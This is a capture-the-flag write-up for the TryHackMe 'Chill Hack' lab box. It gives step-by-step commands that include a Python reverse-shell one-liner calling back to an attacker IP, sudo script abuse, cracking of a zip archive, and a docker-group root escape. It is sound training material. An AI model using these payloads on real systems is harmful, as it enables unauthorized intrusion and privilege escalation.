# TryHackMe – Chill Hack Write-up

#### Nmap Scan
```bash
 nmap -sV -A 10.48.159.15
 ```

![alt text](images/image.png)

#### ftp Access
```bash
ftp 10.48.159.15
```
 username anonymous 
 passsword anonymous

 ![alt text](images/image-1.png)

##### Downloading FTP Files
```bash
 get note.txt
 cat note.txt 
 ```
 ![alt text](images/image-2.png)

usernames : Anurodh, Apaar

#### Directory Enumeration
```bash
gobuster dir -u http://10.48.159.15 -w /usr/share/wordlists/dirb/common.txt 
```
```bash
firefox http://10.49.191.211/secret/
```

![alt text](images/image-3.png)

#### Reverse shell
##### Setting Up a Listening Service on Port 9001
```bash
nc -lvnp 9001
```
##### Reverse Shell Payload Using Python 
```bash
export RHOST="192.168.157.221";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

use https://www.revshells.com/

![alt text](images/image-4.png)

![alt text](images/image-5.png)

#### Privilege escalation (www-data → apaar)
```bash
sudo -l
```

![alt text](images/image-6.png)
```bash
cat /home/apaar/.helpline.sh
```
![alt text](images/image-7.png)

read msg takes user input , $msg is executed as a command
```bash
sudo -u apaar /home/apaar/.helpline.sh
```
![alt text](images/image-8.png)

```bash
/bin/bash
```
![alt text](images/image-9.png)

#### Privilege escalation (www-data → Anurodh)
##### Pivoting Back www-data
![alt text](images/image-10.png)

```bash
cat hacker.php
```

![alt text](images/image-11.png)

![alt text](images/image-12.png)

##### Steganography

```bash
python3 -m http.server 
```

![alt text](images/image-15.png)
```bash
wget http://10.49.191.211:8000/002d7e638fb463fb7a266f5ffc7ac47d.gif
```

![alt text](images/image-13.png)
```bash
wget http://10.49.191.211:8000/hacker-with-laptop_23-2147985341.jpg
```

![alt text](images/image-14.png)
```bash
steghide info hacker-with-laptop_23-2147985341.jpg
```

![alt text](images/image-16.png)
```bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
```

![alt text](images/image-17.png)
##### Cracking the Backup Archive
```bash
unzip backup.zip
```

![alt text](images/image-18.png)
```bash
zip2john backup.zip > zip.hash
```
```bash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![alt text](images/image-19.png)
```bash
unzip backup.zip
```
password: pass1word 

![alt text](images/image-20.png)
```bash
 cat source_code.php 
 ```

![alt text](images/image-21.png)
```bash
 echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d 
 ```

![alt text](images/image-22.png)

![alt text](images/image-23.png)

####  Privilege escalation (Anurodh → root)
##### SSH access (Anurodh)
```bash
ssh anurodh@10.49.191.211
```
  
![alt text](images/image-24.png)
```bash
groups
```

![alt text](images/image-25.png)
```bash
docker run -it --rm -v /:/mnt alpine chroot /mnt /bin/sh
```

![alt text](images/image-26.png)

![alt text](images/image-27.png)
```bash
cat proof.txt
```

![alt text](images/image-28.png)